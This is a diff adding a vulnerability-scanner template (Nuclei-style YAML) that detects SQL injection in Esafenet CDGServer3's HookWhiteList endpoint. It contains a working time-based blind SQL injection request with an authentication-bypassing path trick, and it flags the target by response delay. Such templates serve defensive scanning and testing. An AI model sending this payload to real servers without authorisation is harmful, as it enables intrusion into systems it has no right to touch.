@@ -1,0 +1,32 @@
+id: esafenet-cdgserver3-HookWhiteList-sqli
+info:
+  name: 亿赛通 HookWhiteListservice - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%20HookWhiteListservice%20SQL%20%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,esafenet
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - duration >= 5 && duration < 9
+        condition: and
